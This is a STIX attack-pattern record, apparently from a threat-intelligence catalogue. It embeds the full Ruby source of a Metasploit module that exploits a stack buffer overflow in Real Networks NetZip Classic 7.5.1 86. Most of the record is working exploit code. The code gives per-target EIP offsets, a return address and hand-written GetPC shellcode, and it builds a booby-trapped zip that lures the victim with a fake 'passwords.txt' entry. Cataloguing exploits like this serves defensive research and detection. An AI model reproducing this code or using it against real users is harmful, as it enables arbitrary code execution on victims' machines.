{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--affaa606-6a57-4316-bf4d-c4e0245d5f8b",
    "created": "2024-08-14T16:38:18.992004Z",
    "modified": "2024-08-14T16:38:18.992008Z",
    "name": "Real Networks Netzip Classic 7.5.1 86 File Parsing Buffer Overflow Vulnerability",
    "description": " This module exploits a stack-based buffer overflow vulnerability in version 7.5.1 86 of Real Networks Netzip Classic. In order for the command to be executed, an attacker must convince someone to load a specially crafted zip file with NetZip Classic. By doing so, an attacker can execute arbitrary code as the victim user.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/real_networks_netzip_bof.rb",
            "external_id": "real_networks_netzip_bof.rb"
        },
        {
            "source_name": "reference",
            "url": "http://proforma.real.com"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rex/zip'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Real Networks Netzip Classic 7.5.1 86 File Parsing Buffer Overflow Vulnerability',\n      'Description'    => %q{\n          This module exploits a stack-based buffer overflow vulnerability in\n        version 7.5.1 86 of Real Networks Netzip Classic.\n        In order for the command to be executed, an attacker must convince someone to\n        load a specially crafted zip file with NetZip Classic.\n        By doing so, an attacker can execute arbitrary code as the victim user.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'C4SS!0 G0M3S', # Vulnerability discovery and original exploit\n          'TecR0c <roccogiovannicalvi[at]gmail.com>', # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'OSVDB', '83436' ],\n          [ 'EDB', '16083' ],\n          [ 'BID', '46059' ],\n          [ 'URL', 'http://proforma.real.com' ]\n        ],\n      'Platform'          => [ 'win' ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Payload' =>\n        {\n          'Space'         => 1000,\n          'BadChars'      => Rex::Text.charset_exclude(Rex::Text::AlphaNumeric),\n          'DisableNops'   => true,\n          'EncoderOptions' =>\n            {\n              'BufferRegister' => 'ESI'\n            }\n        },\n      'Targets'        =>\n        [\n          [\n            'Windows XP SP3',\n            {\n              'Offset' => 247,        # To EIP\n              'Ret'    => 0x10061cf9, # PUSH ESP # RETN 08 - NPSYSTEM.dll 7.5.1.86\n              'Max'    => 2000,       # Max buffer size\n            }\n          ],\n\n          [\n            'Windows 7/Windows Vista',\n            {\n              'Offset' => 248,        # To EIP\n              'Ret'    => 0x10061cf9, # PUSH ESP # RETN 08 - NPSYSTEM.dll 7.5.1.86\n              'Max'    => 2000,       # Max buffer size\n            }\n          ],\n        ],\n      'DisclosureDate' => '2011-01-30',\n      'DefaultTarget'  => 0))\n\n      register_options(\n      [\n        OptString.new('FILENAME', [ true, 'The output file name.', 'msf.zip']),\n        OptString.new('CONTENTNAME', [ true, 'Name of the fake zipped file', 'passwords.txt']),\n      ])\n\n  end\n\n  def exploit\n\n    buffer = \"#{datastore['CONTENTNAME']}\"\n    buffer << ' ' * (target['Offset']-buffer.length)\n    buffer << [target.ret].pack('V')\n    buffer << make_nops(8)\n\n    # GetPC - Non ascii characters get converted\n    # alphanum getpc code from corelanc0d3r\n    buffer << \"\\x89\\x05\"   #jmp short (5 bytes) to 'jmp back' at end\n    buffer << \"\\x5e\"       #pop esi\n    buffer << \"\\x41\"       #nop (inc ecx)\n    buffer << \"\\x98\\x99\"   #call esi\n    buffer << \"\\x41\"       #nop (inc ecx)\n    buffer << \"\\x8a\\x94\\x98\\x98\\x98\"  #jmp back to pop esi\n    buffer << payload.encoded\n    buffer << rand_text_alpha(target['Max']-buffer.length)\n\n    zip = Rex::Zip::Archive.new\n    xtra = [0xdac0ffee].pack('V')\n    comment = [0xbadc0ded].pack('V')\n    zip.add_file(buffer, xtra, comment)\n\n    # Create the file\n    print_status(\"Creating '#{datastore['FILENAME']}' file...\")\n\n    file_create(zip.pack)\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-01-30",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}